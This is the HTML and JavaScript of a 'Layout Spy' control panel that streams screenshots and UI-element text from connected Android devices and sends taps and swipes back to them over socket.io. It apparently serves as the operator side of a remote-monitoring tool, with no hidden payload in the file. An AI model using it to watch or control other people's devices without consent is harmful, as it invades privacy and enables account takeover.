<!DOCTYPE html>
<html>
<head>
    <title>üîç Layout Spy Control Panel</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #1a1a1a, #2d2d2d); 
            color: white; height: 100vh; overflow: hidden;
        }
        #devices {
            position: fixed; top: 10px; left: 10px; 
            background: rgba(0,0,0,0.9); padding: 15px; 
            max-height: 80vh; overflow-y: auto; width: 280px; 
            border-radius: 10px; backdrop-filter: blur(10px);
        }
        .device { padding: 12px; margin: 8px 0; background: #333; cursor: pointer; 
            border-radius: 8px; transition: all 0.3s; }
        .device:hover { background: #555; transform: translateX(5px); }
        .active { background: #00ff88 !important; color: #000; }

        #phone-frame {
            width: 400px; height: 800px; margin: 20px auto; 
            background: #000; border: 25px solid #333; border-radius: 50px; 
            position: relative; cursor: pointer; touch-action: none;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        #screen { 
            width: 100%; height: 100%; background: #111; border-radius: 20px;
            position: relative;
        }
        #layout-overlay {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; border-radius: 20px;
        }
        .ui-element {
            position: absolute; border: 1px solid rgba(0,255,136,0.6);
            background: rgba(0,255,136,0.1); pointer-events: none;
            transition: all 0.2s; font-size: 10px; padding: 2px;
        }
        .ui-element:hover { 
            border-color: #00ff88 !important; background: rgba(0,255,136,0.3) !important;
            z-index: 100; box-shadow: 0 2px 8px rgba(0,255,136,0.5);
        }
        .clickable { border-color: #ff6b6b !important; background: rgba(255,107,107,0.2) !important; }
        .text { color: #00ff88; max-width: 100px; overflow: hidden; text-overflow: ellipsis; }

        #stats { position: fixed; top: 10px; right: 10px; background: rgba(0,0,0,0.8); 
            padding: 10px; border-radius: 5px; font-size: 12px; text-align: right; }
        #controls { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); }
        button {
            padding: 12px 25px; margin: 0 8px; background: linear-gradient(45deg, #00ff88, #00cc6a); 
            color: #000; border: none; border-radius: 25px; cursor: pointer; 
            font-size: 14px; font-weight: bold; transition: all 0.3s;
        }
        button:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(0,255,136,0.4); }
    </style>
</head>
<body>
    <div id="devices">
        <h3>üì± Layout Spy Devices</h3>
        <div id="device-list">Loading...</div>
    </div>
    
    <div id="stats">
        <div>Status: <span id="connectionStatus">Connecting...</span></div>
        <div>Device: <span id="selectedDevice">-</span> | 
            Elements: <span id="elementCount">0</span> | 
            FPS: <span id="fps">0</span></div>
    </div>

    <div id="phone-frame">
        <canvas id="screen"></canvas>
        <div id="layout-overlay"></div>
    </div>

    <div id="controls">
        <button onclick="sendBack()">üîô Back</button>
        <button onclick="toggleLayout()">üîç Toggle Layout</button>
        <button onclick="toggleFullScreen()">üì± Fullscreen</button>
    </div>

    <script>
        const socket = io();
        let currentDevice = null;
        let deviceWidth = 1080, deviceHeight = 1920;
        let showLayout = true;
        let layoutData = [];
        let lastFrameTime = 0, frameCount = 0;

        const canvas = document.getElementById('screen');
        const ctx = canvas.getContext('2d');
        const overlay = document.getElementById('layout-overlay');
        const phoneFrame = document.getElementById('phone-frame');
        const deviceList = document.getElementById('device-list');
        const connectionStatus = document.getElementById('connectionStatus');
        const selectedDeviceSpan = document.getElementById('selectedDevice');
        const elementCount = document.getElementById('elementCount');
        const fpsDisplay = document.getElementById('fps');

        // Socket events
        socket.on('connect', () => {
            connectionStatus.textContent = '‚úÖ Connected';
            connectionStatus.style.color = '#00ff88';
        });

        socket.on('devices-update', (devices) => {
            updateDeviceList(devices);
        });

        // üî• LAYOUT DATA HANDLER
        socket.on('layout-dump', (data) => {
            if (data.deviceId !== currentDevice) return;
            layoutData = data.layout;
            renderLayout();
            elementCount.textContent = layoutData.length;
        });

        // Screenshot handler
        socket.on('screen-frame', (data) => {
            if (data.deviceId !== currentDevice || data.type !== 'screenshot') return;
            
            deviceWidth = data.width;
            deviceHeight = data.height;
            
            const img = new Image();
            img.onload = () => {
                const rect = phoneFrame.getBoundingClientRect();
                canvas.width = rect.width;
                canvas.height = rect.height;
                ctx.imageSmoothingEnabled = false;
                ctx.drawImage(img, 0, 0, rect.width, rect.height);
                
                frameCount++;
                const now = performance.now();
                if (now - lastFrameTime >= 1000) {
                    fpsDisplay.textContent = Math.round(frameCount * 1000 / (now - lastFrameTime));
                    frameCount = 0;
                    lastFrameTime = now;
                }
            };
            img.src = 'data:image/jpeg;base64,' + data.data;
        });

        function updateDeviceList(devices) {
            deviceList.innerHTML = devices.length ? 
                devices.map(([id, info]) => `
                    <div class="device ${!info.connected ? 'disconnected' : ''}" 
                         onclick="selectDevice('${id}', this)">
                        <b>${info.model || id.slice(0,8)}</b><br>
                        <small>${info.brand || ''} ${info.version || ''}</small>
                        ${info.connected ? 'üü¢ LIVE' : 'üî¥ OFF'}
                    </div>
                `).join('') : 'No devices';
        }

        function selectDevice(deviceId, el) {
            currentDevice = deviceId;
            selectedDeviceSpan.textContent = deviceId.slice(0,8);
            document.querySelectorAll('.device').forEach(d => d.classList.remove('active'));
            el.classList.add('active');
            socket.emit('control', { deviceId });
        }

        function renderLayout() {
            overlay.innerHTML = '';
            if (!showLayout) return;

            layoutData.forEach((element, index) => {
                const bounds = element.bounds;
                const el = document.createElement('div');
                el.className = `ui-element ${element.clickable ? 'clickable' : ''}`;
                el.style.left = `${(bounds.left / deviceWidth) * 100}%`;
                el.style.top = `${(bounds.top / deviceHeight) * 100}%`;
                el.style.width = `${(bounds.width / deviceWidth) * 100}%`;
                el.style.height = `${(bounds.height / deviceHeight) * 100}%`;
                
                let label = '';
                if (element.text) label = element.text.slice(0, 20);
                else if (element.contentDesc) label = element.contentDesc.slice(0, 20);
                
                el.innerHTML = `<div class="text">${label || 'UI'}</div>`;
                el.title = `${element.className}\nText: ${element.text || 'N/A'}\nClickable: ${element.clickable}`;
                overlay.appendChild(el);
            });
        }

        // PERFECT Tap/Swipe with Layout Awareness
        function getScaledCoords(clientX, clientY) {
            const rect = phoneFrame.getBoundingClientRect();
            const scaleX = deviceWidth / rect.width;
            const scaleY = deviceHeight / rect.height;
            return {
                x: Math.floor((clientX - rect.left) * scaleX),
                y: Math.floor((clientY - rect.top) * scaleY)
            };
        }

        let startX = 0, startY = 0, dragging = false;
        phoneFrame.addEventListener('click', (e) => {
            if (!currentDevice) return;
            e.preventDefault();
            const coords = getScaledCoords(e.clientX, e.clientY);
            sendTap(coords.x, coords.y);
        });

        ['mousedown', 'touchstart'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                e.preventDefault();
                dragging = true;
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                startX = coords.x; startY = coords.y;
            });
        });

        ['mousemove', 'touchmove'].forEach(event => {
            phoneFrame.addEventListener(event, e => {
                if (!dragging || !currentDevice) return;
                e.preventDefault();
                const coords = getScaledCoords(
                    e.touches?.[0]?.clientX || e.clientX,
                    e.touches?.[0]?.clientY || e.clientY
                );
                sendSwipe(startX, startY, coords.x, coords.y);
            });
        });

        ['mouseup', 'touchend'].forEach(event => {
            phoneFrame.addEventListener(event, e => dragging = false);
        });

        function sendTap(x, y) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'tap', x, y 
            });
        }

        function sendSwipe(sx, sy, ex, ey) {
            if (!currentDevice) return;
            socket.emit('control', { 
                deviceId: currentDevice, action: 'swipe', 
                startX: sx, startY: sy, endX: ex, endY: ey 
            });
        }

        function sendBack() {
            if (!currentDevice) return;
            socket.emit('control', { deviceId: currentDevice, action: 'back' });
        }

        function toggleLayout() {
            showLayout = !showLayout;
            overlay.style.display = showLayout ? 'block' : 'none';
            renderLayout();
        }

        function toggleFullScreen() {
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        fetch('/devices').then(r => r.json()).then(updateDeviceList);
    </script>
</body>
</html>
